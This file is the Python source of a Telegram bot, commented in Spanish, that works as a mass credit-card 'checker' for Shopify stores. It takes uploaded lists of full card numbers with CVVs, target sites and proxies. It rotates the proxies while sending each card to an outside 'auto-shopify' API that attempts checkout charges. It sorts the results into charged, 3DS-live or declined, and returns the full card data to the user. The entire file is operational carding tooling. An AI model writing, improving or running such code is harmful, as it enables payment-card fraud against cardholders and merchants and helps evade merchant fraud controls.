# -*- coding: utf-8 -*-
"""
Bot de Telegram para verificar tarjetas - VERSIÓN SAMURAI CONCURRENTE 3x
OPTIMIZADO PARA MÁXIMA VELOCIDAD EN RAILWAY
"""

import os
import json
import logging
import asyncio
import time
import random
import sqlite3
import re
from typing import Dict, List, Tuple, Optional
from datetime import datetime
import signal
import sys

from telegram import Update, Document
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import aiohttp

# ================== CONFIGURACIÓN ==================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ================== CONFIGURACIÓN ==================
class Settings:
    """Configuración global del bot - VERSIÓN OPTIMIZADA"""
    # 🔴 TOKEN DEL BOT
    TOKEN = os.environ.get("BOT_TOKEN")
    if not TOKEN:
        raise ValueError("❌ ERROR: BOT_TOKEN no está configurado")
    
    API_ENDPOINTS = [
        "https://auto-shopify-api-production.up.railway.app/index.php",
    ]

    DB_FILE = "bot_samurai.db"
    
    # Timeouts OPTIMIZADOS
    TIMEOUT_CONFIG = {
        "connect": 5,        # Reducido de 10 a 5
        "sock_read": 20,      # Reducido de 45 a 20
        "total": None,
        "response_body": 20,
    }
    
    # Configuración de concurrencia
    CONCURRENT_LIMIT = 3

# ================== CLASIFICADOR SAMURAI ==================
class SamuraiClassifier:
    @staticmethod
    def classify(response_text: str, status_code: int) -> Dict:
        response_lower = response_text.lower()
        
        # CHARGED
        thank_you_pattern = r'thank\s*you.*?\$?(\d+\.\d{2})'
        thank_match = re.search(thank_you_pattern, response_lower, re.IGNORECASE)
        if thank_match and "thank" in response_lower:
            return {
                "status": "CHARGED",
                "emoji": "✅",
                "amount": f"${thank_match.group(1)}"
            }
        
        # 3DS
        if "3ds" in response_lower or "3d_authentication" in response_lower:
            return {"status": "3DS", "emoji": "🔒", "amount": None}
        
        # INSUFFICIENT FUNDS
        if "insufficient_funds" in response_lower:
            return {"status": "DECLINED", "emoji": "💸", "amount": None}
        
        # CAPTCHA
        if "captcha" in response_lower:
            return {"status": "CAPTCHA", "emoji": "🤖", "amount": None}
        
        # GENERIC DECLINE
        if "generic_decline" in response_lower or "declined" in response_lower:
            return {"status": "DECLINED", "emoji": "❌", "amount": None}
        
        return {"status": "UNKNOWN", "emoji": "❓", "amount": None}

# ================== DETECTOR INTELIGENTE DE LÍNEAS ==================
class LineDetector:
    @staticmethod
    def detect(line: str) -> Tuple[str, Optional[str]]:
        line = line.strip()
        if not line:
            return None, None

        # SITES
        if line.startswith(('http://', 'https://')):
            return 'site', line
        
        domain_pattern = r'^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}(:\d+)?$'
        if re.match(domain_pattern, line):
            return 'site', f"https://{line}"

        # PROXIES
        parts = line.split(':')
        if len(parts) in [2, 4]:
            if parts[1].isdigit() and 1 <= int(parts[1]) <= 65535:
                return 'proxy', line

        # CARDS
        if '|' in line:
            parts = line.split('|')
            if len(parts) == 4 and all(p.isdigit() for p in parts):
                return 'card', line

        return None, None

# ================== BASE DE DATOS ==================
class Database:
    def __init__(self):
        self._init_db()
    
    def _init_db(self):
        with sqlite3.connect(Settings.DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    sites TEXT DEFAULT '[]',
                    proxies TEXT DEFAULT '[]',
                    cards TEXT DEFAULT '[]'
                )
            ''')
            conn.commit()
    
    def get_user_data(self, user_id: int) -> Dict:
        with sqlite3.connect(Settings.DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT sites, proxies, cards FROM users WHERE user_id = ?", (user_id,))
            row = cursor.fetchone()
            
            if not row:
                cursor.execute("INSERT INTO users (user_id, sites, proxies, cards) VALUES (?, ?, ?, ?)",
                             (user_id, '[]', '[]', '[]'))
                conn.commit()
                return {"sites": [], "proxies": [], "cards": []}
            
            return {
                "sites": json.loads(row[0]),
                "proxies": json.loads(row[1]),
                "cards": json.loads(row[2])
            }
    
    def _save(self, user_id: int, data: Dict):
        with sqlite3.connect(Settings.DB_FILE) as conn:
            cursor = conn.cursor()
            cursor.execute(
                "UPDATE users SET sites = ?, proxies = ?, cards = ? WHERE user_id = ?",
                (json.dumps(data["sites"]), json.dumps(data["proxies"]), json.dumps(data["cards"]), user_id)
            )
            conn.commit()
    
    def add_items(self, user_id: int, sites: List[str], proxies: List[str], cards: List[str]) -> Dict:
        data = self.get_user_data(user_id)
        
        sites_added = sum(1 for s in sites if s not in data["sites"] and data["sites"].append(s) is None)
        proxies_added = sum(1 for p in proxies if p not in data["proxies"] and data["proxies"].append(p) is None)
        
        cards_added = 0
        for card in cards:
            if card not in data["cards"] and CardValidator.parse_card(card):
                data["cards"].append(card)
                cards_added += 1
        
        if sites_added > 0 or proxies_added > 0 or cards_added > 0:
            self._save(user_id, data)
        
        return {"sites": sites_added, "proxies": proxies_added, "cards": cards_added}
    
    def get_cards_parsed(self, user_id: int) -> List[Dict]:
        return [c for c in (CardValidator.parse_card(card) for card in self.get_user_data(user_id)["cards"]) if c]
    
    def remove_all_sites(self, user_id: int) -> int:
        data = self.get_user_data(user_id)
        count = len(data["sites"])
        data["sites"] = []
        self._save(user_id, data)
        return count
    
    def remove_all_proxies(self, user_id: int) -> int:
        data = self.get_user_data(user_id)
        count = len(data["proxies"])
        data["proxies"] = []
        self._save(user_id, data)
        return count
    
    def remove_all_cards(self, user_id: int) -> int:
        data = self.get_user_data(user_id)
        count = len(data["cards"])
        data["cards"] = []
        self._save(user_id, data)
        return count

# ================== VALIDACIÓN DE TARJETAS ==================
class CardValidator:
    @staticmethod
    def luhn_check(card_number: str) -> bool:
        digits = [int(d) for d in card_number]
        checksum = sum(digits[-1::-2]) + sum(sum(divmod(d * 2, 10)) for d in digits[-2::-2])
        return checksum % 10 == 0

    @staticmethod
    def validate_expiry(month: str, year: str) -> bool:
        try:
            exp_month = int(month)
            exp_year = int(year)
            if len(year) == 2:
                exp_year += 2000
            now = datetime.now()
            return not (exp_year < now.year or (exp_year == now.year and exp_month < now.month))
        except:
            return False

    @staticmethod
    def validate_cvv(cvv: str) -> bool:
        return cvv.isdigit() and len(cvv) in (3, 4)

    @staticmethod
    def parse_card(card_str: str) -> Optional[Dict]:
        parts = card_str.split('|')
        if len(parts) != 4:
            return None
        number, month, year, cvv = parts
        if (number.isdigit() and 13 <= len(number) <= 19 and
            CardValidator.luhn_check(number) and
            CardValidator.validate_expiry(month, year) and
            CardValidator.validate_cvv(cvv)):
            return {
                "number": number,
                "month": month,
                "year": year,
                "cvv": cvv,
                "bin": number[:6],
                "last4": number[-4:],
                "full": card_str
            }
        return None

# ================== VERIFICADOR OPTIMIZADO ==================
class SamuraiChecker:
    @staticmethod
    async def check_card(card_data: Dict, site: str, proxy: str, session: aiohttp.ClientSession) -> Dict:
        card_str = f"{card_data['number']}|{card_data['month']}|{card_data['year']}|{card_data['cvv']}"
        params = {"site": site, "cc": card_str, "proxy": proxy}
        
        api_endpoint = Settings.API_ENDPOINTS[0]  # Sin random para velocidad
        
        # Configurar proxy
        proxy_parts = proxy.split(':')
        proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}" if len(proxy_parts) == 4 else f"http://{proxy}"
        proxy_display = f"{proxy_parts[0]}:{proxy_parts[1]}" if len(proxy_parts) >= 2 else proxy
        
        start_time = time.time()
        
        try:
            async with session.get(api_endpoint, params=params, proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                response_text = await resp.text()
                elapsed = time.time() - start_time
                
                classification = SamuraiClassifier.classify(response_text, resp.status)
                
                return {
                    "success": classification["status"] in ["CHARGED", "3DS"],
                    "status": classification["status"],
                    "emoji": classification["emoji"],
                    "amount": classification.get("amount"),
                    "time": round(elapsed, 2),
                    "site": site,
                    "proxy": proxy_display,
                    "card": f"{card_data['bin']}xxxxxx{card_data['last4']}",
                    "full_card": card_str
                }
                
        except Exception as e:
            elapsed = time.time() - start_time
            return {
                "success": False,
                "status": "ERROR",
                "emoji": "⚠️",
                "time": round(elapsed, 2),
                "card": f"{card_data['bin']}xxxxxx{card_data['last4']}",
                "full_card": card_str
            }

# ================== BARRA DE PROGRESO ==================
def create_progress_bar(current: int, total: int, width: int = 20) -> str:
    if total == 0:
        return "[" + "░" * width + "]"
    filled = int((current / total) * width)
    return "[" + "█" * filled + "░" * (width - filled) + "]"

# ================== VARIABLES GLOBALES ==================
db = Database()
active_mass = {}

# ================== COMANDOS ==================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🔥 *SAMURAI SHOPIFY CHECKER 3x*\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        "✅ Thank You $XX.XX ➔ CHARGED\n"
        "🔒 3DS ➔ 3DS (LIVE)\n"
        "❌ GENERIC_DECLINE ➔ DECLINED\n"
        "💸 INSUFFICIENT_FUNDS ➔ DECLINED\n"
        "🤖 CAPTCHA ➔ BLOQUEADO\n\n"
        "⚡ *OPTIMIZADO:* Timeouts reducidos\n\n"
        "📌 Envía un archivo `.txt` y usa `/mass`",
        parse_mode="Markdown"
    )

# ================== MANEJO DE ARCHIVOS ==================
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Envía un archivo .txt")
        return
    
    msg = await update.message.reply_text("🔄 Analizando archivo...")
    
    file = await context.bot.get_file(document.file_id)
    content = await file.download_as_bytearray()
    text = content.decode('utf-8', errors='ignore')
    
    sites, proxies, cards = [], [], []
    
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        tipo, normalizado = LineDetector.detect(line)
        if tipo == 'site':
            sites.append(normalizado)
        elif tipo == 'proxy':
            proxies.append(normalizado)
        elif tipo == 'card' and CardValidator.parse_card(normalizado):
            cards.append(normalizado)
    
    added = db.add_items(user_id, sites, proxies, cards)
    
    response = [f"📊 *ANÁLISIS*\n━━━━━━━━━━━━━━━━━━\n"]
    if sites:
        response.append(f"🌐 SITIOS: {len(sites)} (nuevos: {added['sites']})")
    if proxies:
        response.append(f"🔌 PROXIES: {len(proxies)} (nuevos: {added['proxies']})")
    if cards:
        response.append(f"💳 TARJETAS: {len(cards)} (nuevas: {added['cards']})")
    
    await msg.edit_text("\n".join(response), parse_mode="Markdown")

# ================== LISTAR ==================
async def list_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = db.get_user_data(update.effective_user.id)
    if not data["sites"]:
        await update.message.reply_text("📭 No hay sitios")
        return
    await update.message.reply_text("📋 *SITIOS*\n" + "\n".join(f"{i}. {s}" for i, s in enumerate(data["sites"], 1)), parse_mode="Markdown")

async def list_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = db.get_user_data(update.effective_user.id)
    if not data["proxies"]:
        await update.message.reply_text("📭 No hay proxies")
        return
    await update.message.reply_text("📋 *PROXIES*\n" + "\n".join(f"{i}. `{p.split(':')[0]}:{p.split(':')[1]}`" for i, p in enumerate(data["proxies"], 1)), parse_mode="Markdown")

async def list_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = db.get_user_data(update.effective_user.id)
    if not data["cards"]:
        await update.message.reply_text("📭 No hay tarjetas")
        return
    cards = []
    for i, c in enumerate(data["cards"], 1):
        p = c.split('|')
        cards.append(f"{i}. `{p[0][:6]}xxxxxx{p[0][-4:]}|{p[1]}|{p[2]}|{p[3]}`")
    await update.message.reply_text("📋 *TARJETAS*\n" + "\n".join(cards), parse_mode="Markdown")

# ================== ELIMINAR ==================
async def remove_all_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = db.remove_all_sites(update.effective_user.id)
    await update.message.reply_text(f"🗑️ {count} sitios eliminados")

async def remove_all_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = db.remove_all_proxies(update.effective_user.id)
    await update.message.reply_text(f"🗑️ {count} proxies eliminados")

async def remove_all_cards(update: Update, context: ContextTypes.DEFAULT_TYPE):
    count = db.remove_all_cards(update.effective_user.id)
    await update.message.reply_text(f"🗑️ {count} tarjetas eliminadas")

# ================== MASS CHECK OPTIMIZADO ==================
async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id in active_mass and active_mass[user_id]:
        await update.message.reply_text("❌ Ya hay un mass check en curso. Usa /stop")
        return
    
    user_data = db.get_user_data(user_id)
    
    if not user_data["sites"] or not user_data["proxies"]:
        await update.message.reply_text("❌ Faltan sitios o proxies")
        return
    
    cards = db.get_cards_parsed(user_id)
    if not cards:
        await update.message.reply_text("❌ No hay tarjetas")
        return
    
    active_mass[user_id] = True
    
    # Mensaje inicial
    msg = await update.message.reply_text(
        f"🔥 *MASS CHECK 3x*\n"
        f"📊 {len(cards)} tarjetas\n"
        f"🔄 {len(user_data['sites'])} sitios | {len(user_data['proxies'])} proxies\n\n"
        f"⏳ Iniciando..."
    )
    
    results = []
    start_time = time.time()
    charged = three_ds = declined = captcha = errors = 0
    site_index = proxy_index = 0
    
    connector = aiohttp.TCPConnector(limit=Settings.CONCURRENT_LIMIT, ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        total = len(cards)
        processed = 0
        
        for i in range(0, total, Settings.CONCURRENT_LIMIT):
            if not active_mass.get(user_id):
                break
            
            batch = cards[i:i+Settings.CONCURRENT_LIMIT]
            tasks = []
            
            for card in batch:
                site = user_data["sites"][site_index % len(user_data["sites"])]
                site_index += 1
                proxy = user_data["proxies"][proxy_index % len(user_data["proxies"])]
                proxy_index += 1
                tasks.append(SamuraiChecker.check_card(card, site, proxy, session))
            
            batch_results = await asyncio.gather(*tasks)
            results.extend(batch_results)
            
            # Actualizar contadores
            for r in batch_results:
                if r["status"] == "CHARGED":
                    charged += 1
                elif r["status"] == "3DS":
                    three_ds += 1
                elif r["status"] == "DECLINED":
                    declined += 1
                elif r["status"] == "CAPTCHA":
                    captcha += 1
                else:
                    errors += 1
            
            processed += len(batch)
            
            # ACTUALIZACIÓN RÁPIDA
            bar = create_progress_bar(processed, total)
            last = batch_results[-1] if batch_results else None
            last_text = f"{last['emoji']} {last['card']}" if last else ""
            
            try:
                await msg.edit_text(
                    f"🔥 *MASS CHECK 3x*\n"
                    f"━━━━━━━━━━━━━━━━━━\n\n"
                    f"Progreso: {bar} {processed}/{total}\n"
                    f"✅ CHARGED: {charged}\n"
                    f"🔒 3DS: {three_ds}\n"
                    f"❌ DECLINED: {declined}\n"
                    f"🤖 CAPTCHA: {captcha}\n"
                    f"⏱️ ERRORES: {errors}\n\n"
                    f"📌 {last_text}\n\n"
                    f"⏳ Procesando..."
                )
            except:
                pass  # Ignorar errores de edición
    
    elapsed = time.time() - start_time
    active_mass[user_id] = False
    
    # Generar archivo
    filename = f"results_{user_id}_{int(time.time())}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(f"SAMURAI RESULTS - {datetime.now()}\n")
        f.write(f"Tiempo: {elapsed:.2f}s\n")
        f.write(f"✅ {charged} | 🔒 {three_ds} | ❌ {declined} | 🤖 {captcha} | ⚠️ {errors}\n\n")
        
        for i, r in enumerate(results, 1):
            f.write(f"[{i}] {r['emoji']} {r['card']} - {r['status']}\n")
            f.write(f"    {r['site']} | {r['proxy']} | {r['time']}s\n")
            f.write(f"    {r['full_card']}\n\n")
    
    with open(filename, "rb") as f:
        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=f,
            filename=filename,
            caption=f"🔥 {len(results)} tarjetas en {elapsed:.1f}s"
        )
    
    os.remove(filename)
    
    bar = create_progress_bar(processed, total)
    await update.message.reply_text(
        f"✅ *COMPLETADO*\n"
        f"{bar} {processed}/{total}\n"
        f"✅ {charged} | 🔒 {three_ds} | ❌ {declined} | 🤖 {captcha} | ⚠️ {errors}\n"
        f"⏱️ {elapsed:.1f}s",
        parse_mode="Markdown"
    )

async def stop_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in active_mass and active_mass[user_id]:
        active_mass[user_id] = False
        await update.message.reply_text("⏹ Deteniendo...")
    else:
        await update.message.reply_text("No hay mass check activo")

# ================== MAIN ==================
def main():
    print("🔥 SAMURAI OPTIMIZADO")
    app = Application.builder().token(Settings.TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("sites", list_sites))
    app.add_handler(CommandHandler("proxies", list_proxies))
    app.add_handler(CommandHandler("cards", list_cards))
    app.add_handler(CommandHandler("rmsite", remove_all_sites))
    app.add_handler(CommandHandler("rmproxy", remove_all_proxies))
    app.add_handler(CommandHandler("rmcard", remove_all_cards))
    app.add_handler(CommandHandler("mass", mass_command))
    app.add_handler(CommandHandler("stop", stop_mass))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_document))
    
    app.run_polling()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n👋 Bye")
        sys.exit(0)
